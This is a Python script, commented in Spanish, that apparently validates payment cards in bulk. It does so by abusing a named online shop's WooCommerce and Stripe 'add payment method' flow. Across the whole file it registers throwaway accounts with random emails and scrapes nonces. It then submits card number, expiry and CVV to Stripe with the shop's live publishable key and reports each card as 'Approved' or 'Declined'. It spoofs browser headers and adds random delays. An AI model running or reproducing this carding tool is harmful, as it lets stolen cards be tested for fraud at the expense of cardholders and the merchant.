import requests
import json
import uuid
import random
import string
from requests.exceptions import RequestException, Timeout, ConnectTimeout

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

class StripeAuth:
    def main(self, card):
        session = requests.Session()
        max_attempts = 3
        attempt = 0

        while attempt < max_attempts:
            try:
                # Generar datos aleatorios
                guid = str(uuid.uuid4())
                muid = str(uuid.uuid4())
                sid = str(uuid.uuid4())
                base_name = "alex"
                domain = "gmail.com"
                number = random.randint(1000, 99999)
                suffix = ''.join(random.choices(string.ascii_lowercase, k=3))
                email = f"{base_name}{number}{suffix}@{domain}"

                # Parsear la tarjeta
                cc_num, exp_month, exp_year, cvv = card.split("|")
                exp_year = exp_year[-2:]  # Usar los últimos 2 dígitos del año

                # Paso 1: GET a /my-account/
                headers1 = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=0, i',
                    'referer': 'https://robosoft.ai/my-account/add-payment-method/',
                    'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'sec-gpc': '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                }
                print("DEBUG: Iniciando GET a robosoft.ai/my-account/")
                response1 = session.get('https://robosoft.ai/my-account/', headers=headers1, timeout=20)
                regi = parseX(response1.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
                if regi == "None":
                    raise ValueError("No se encontró el nonce de registro")
                time.sleep(random.uniform(1, 3))

                # Paso 2: POST a /my-account/ para registro
                headers2 = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://robosoft.ai',
                    'pragma': 'no-cache',
                    'priority': 'u=0, i',
                    'referer': 'https://robosoft.ai/my-account/',
                    'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'sec-gpc': '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                }
                data2 = {
                    'email': email,
                    'woocommerce-register-nonce': regi,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }
                print("DEBUG: Iniciando POST a robosoft.ai/my-account/ para registro")
                response2 = session.post('https://robosoft.ai/my-account/', headers=headers2, data=data2, timeout=20)
                time.sleep(random.uniform(1, 3))

                # Paso 3: GET a /my-account/
                headers3 = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=0, i',
                    'referer': 'https://robosoft.ai/my-account/',
                    'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'sec-gpc': '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                }
                print("DEBUG: Iniciando GET a robosoft.ai/my-account/")
                response3 = session.get('https://robosoft.ai/my-account/', headers=headers3, timeout=20)
                time.sleep(random.uniform(1, 3))

                # Paso 4: GET a /payment-methods/
                headers4 = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=0, i',
                    'referer': 'https://robosoft.ai/my-account/',
                    'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'sec-gpc': '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                }
                print("DEBUG: Iniciando GET a robosoft.ai/my-account/payment-methods/")
                response4 = session.get('https://robosoft.ai/my-account/payment-methods/', headers=headers4, timeout=20)
                time.sleep(random.uniform(1, 3))

                # Paso 5: GET a /add-payment-method/
                headers5 = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=0, i',
                    'referer': 'https://robosoft.ai/my-account/payment-methods/',
                    'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'sec-gpc': '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                }
                print("DEBUG: Iniciando GET a robosoft.ai/my-account/add-payment-method/")
                response5 = session.get('https://robosoft.ai/my-account/add-payment-method/', headers=headers5, timeout=20)
                nonce = parseX(response5.text, '"add_card_nonce":"', '",')
                if nonce == "None":
                    raise ValueError("No se encontró el nonce de pago")
                time.sleep(random.uniform(1, 3))

                # Paso 6: POST a Stripe API /sources
                headers6 = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                }
                data6 = {
                    'referrer': 'https://robosoft.ai',
                    'type': 'card',
                    'owner[name]': ' ',
                    'owner[email]': email,
                    'card[number]': cc_num,
                    'card[cvc]': cvv,
                    'card[exp_month]': exp_month,
                    'card[exp_year]': exp_year,
                    'guid': guid,
                    'muid': muid,
                    'sid': sid,
                    'pasted_fields': 'number,cvc',
                    'payment_user_agent': 'stripe.js/4d9faf87d7; stripe-js-v3/4d9faf87d7; split-card-element',
                    'time_on_page': '181261',
                    'key': 'pk_live_51IzngzANzfGIJhh4KJQYpleKU8VWHVJmAnUz7jJHqZmKScLCK2vBwixs0ELbw8VvtRHX7eaaMMNy4wFxYaJAbKro00OEy5fkOA'
                }
                print("DEBUG: Iniciando POST a api.stripe.com/v1/sources")
                response6 = session.post('https://api.stripe.com/v1/sources', headers=headers6, data=data6, timeout=20)
                source_id = response6.json().get('id')
                if not source_id:
                    raise ValueError("No se obtuvo el source_id de Stripe")
                time.sleep(random.uniform(1, 3))

                # Paso 7: POST a /wc-ajax=wc_stripe_create_setup_intent
                headers7 = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://robosoft.ai',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'referer': 'https://robosoft.ai/my-account/add-payment-method/',
                    'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                params = {
                    'wc-ajax': 'wc_stripe_create_setup_intent',
                }
                data7 = {
                    'stripe_source_id': source_id,
                    'nonce': nonce,
                }
                print("DEBUG: Iniciando POST a robosoft.ai/wc-ajax=wc_stripe_create_setup_intent")
                response7 = session.post('https://robosoft.ai/', params=params, headers=headers7, data=data7, timeout=20)
                response_data = response7.json()

                session.close()

                # Procesar la respuesta
                if response_data.get('result') == 'success':
                    return 'Approved! ✅', 'Payment method added successfully'
                else:
                    error_message = response_data.get('messages', 'Unknown error')
                    if '<li>' in error_message:
                        error_message = error_message.split('<li>')[-1].split('</li>')[0].strip()
                    return 'Declined! ❌', error_message

            except (RequestException, ValueError, KeyError) as e:
                attempt += 1
                if session:
                    session.close()
                print(f"❌ Error en StripeAuth (intento {attempt}/{max_attempts}): {e}")
                time.sleep(2)
                if attempt >= max_attempts:
                    return 'Declined! ❌', 'Error: Avisar a soporte'
                continue
            except Exception as e:
                if session:
                    session.close()
                print(f"❌ Error inesperado en StripeAuth: {e}")
                return 'Declined! ❌', 'Error: Avisar a soporte'